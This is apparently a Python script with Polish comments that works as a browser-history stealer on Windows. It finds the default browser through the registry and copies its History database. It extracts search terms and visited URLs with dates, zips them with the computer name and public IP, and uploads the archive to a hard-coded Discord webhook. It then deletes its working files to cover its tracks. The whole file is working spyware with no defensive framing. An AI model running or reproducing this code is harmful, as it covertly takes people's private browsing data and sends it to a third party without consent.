import os
import sqlite3
import winreg
import getpass
import shutil
import zipfile
import requests
import json

# 1.Pobrać przeglądarki z rejestru i dostanie się do jej ścieżki

Web_hook ='https://discordapp.com/api/webhooks/1525264319565009088/-Xey57_EDn47J5KBOB2X968gfB_l9msiFD3Vq_HgPdCMvEuUQT0SVXY0ehbRirEWbe7D'

user = getpass.getuser()

temp = f"C:/Users/{user}/AppData/Local/Temp/"
browser={
    "chrome.exe": f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History",
    "msedge.exe": f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
    "opera.exe": f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History",
    "launcher.exe": f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History", # Opera czasem używa launcher.exe
    "brave.exe": f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
    "vivaldi.exe": f"C:/Users/{user}/AppData/Local/Vivaldi/User Data/Default/History",
    "centbrowser.exe": f"C:/Users/{user}/AppData/Local/CentBrowser/User Data/Default/History",
    "chromium.exe": f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History",
    "colibri.exe": f"C:/Users/{user}/AppData/Roaming/Colibri/History"}

def get_browser_exe_name():
    """Odczytuje rejestr i zwraca wyłącznie nazwę pliku wykonywalnego z rozszerzeniem .exe"""
    user_choice_key = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
    
    try:
        # 1. Pobierz identyfikator ProgId aktualnej domyślnej przeglądarki
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, user_choice_key) as key:
            prog_id, _ = winreg.QueryValueEx(key, "ProgId")

        # 2. Pobierz pełną komendę systemową zapisaną dla tego ProgId
        command_key = rf"{prog_id}\shell\open\command"
        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, command_key) as key:
            command, _ = winreg.QueryValueEx(key, "")

        # 3. Wyciągnij surową ścieżkę do pliku (usuwając cudzysłowy)
        if '"' in command:
            full_path = command.split('"')[1]
        else:
            full_path = command.split()[0]

        # 4. Wyciągnij samą nazwę pliku z rozszerzeniem .exe i zamień na małe litery
        exe_name = os.path.basename(full_path).lower()
        return exe_name

    except Exception:
        # Rejestr awaryjny (globalny), jeśli klucz użytkownika nie odpowiada
        try:
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"http\shell\open\command") as key:
                command, _ = winreg.QueryValueEx(key, "")
                full_path = command.split('"')[1] if '"' in command else command.split()[0]
                return os.path.basename(full_path).lower()
        except:
            return "brave.exe"
    
# dostać się do histori

path = browser[get_browser_exe_name()]

os.makedirs(temp+"browser-data/",exist_ok=True)

new_path = temp+"browser-data/History"


shutil.copy(path,new_path)

# searching - history
# sql
try:
    with sqlite3.connect(new_path) as connection:

        cursor = connection.cursor()

        cursor.execute("SELECT term FROM keyword_search_terms")

        terms = [wiersz[0] for wiersz in cursor.fetchall()]

        with open (temp+"browser-data/search-history.txt","w",encoding='utf-8') as file:
            file.write("Lp. | SERCHING "+"\n")
            for numer,(term) in enumerate(terms,start=1):
                line = f"{numer} | {term}"
                file.write(line + "\n")
        
        

except Exception as exc:
    with open (temp+"browser-data/search-history.txt","w",encoding='utf-8') as file:
        file.write(str(exc) +"\n")
finally:
    cursor.close()
    connection.close()



# 2.skopiować niezbłdnie wpisy z histori


try:
    with sqlite3.connect(new_path) as connection:

        cursor = connection.cursor()

        cursor.execute("SELECT url, title, datetime((last_visit_time / 1000000) - 11644473600, 'unixepoch', 'localtime') AS data_wizyty FROM urls")

        url_data = cursor.fetchall()

        line_num =1

        with open (temp+"browser-data/search-history_url.txt","w",encoding='utf-8') as file:
            file.write("Lp. | URL | TITLE | DATE "+"\n")
            for url, title, data_wizyty in url_data:
                linia = f"{line_num} | {url} | {title} | {data_wizyty}"

                file.write(linia + "\n")

                line_num +=1


except Exception:
    with open (temp+"browser-data/search-history_url.txt","w",encoding='utf-8') as file:
        file.write("ERROR")
        file.write(str(Exception))
finally:
    cursor.close()
    connection.close()



# pakowanie do zipa
file_for_zipping = [temp+"browser-data/search-history_url.txt",temp+"browser-data/search-history.txt"]

try:  
    with zipfile.ZipFile(temp+"/history.zip","w") as zipf:
        for file in file_for_zipping:
            nazwa_w_zipie = os.path.basename(file)
            zipf.write(file, arcname=nazwa_w_zipie)
except Exception:
    pass

# 4.wysłać ten plik

sciezka_pliku = temp + "/history.zip" 

Pc_id = os.environ['COMPUTERNAME']
ip_adress = requests.get('https://api.ipify.org').text





with open(sciezka_pliku, "rb") as f:
    # 2. W nazwie pliku wysyłanego na Discorda podajemy tylko "history.zip", 
    #    żeby Discord nie próbował odczytać ścieżki systemowej z komputera.
    files = {
        "file": ("history.zip", f, "application/zip")
    }

    payload = {
        "content": f"Oto Twój spakowany plik ZIP z komputera: {Pc_id} o adresie publicznym: {ip_adress} "
    }

    # 3. KLUCZOWA POPRAWKA: Używamy json.dumps(payload), aby zamienić słownik na tekst JSON
    response = requests.post(
        Web_hook,
        data={"payload_json": json.dumps(payload)},
        files=files
    )

path_brwserdata = temp+ "browser-data/"
# 5 usunać plik i skrypt
os.remove(sciezka_pliku)
os.remove(path_brwserdata +"History")
os.remove(path_brwserdata +"search-history.txt")
os.remove(path_brwserdata +"search-history_url.txt")
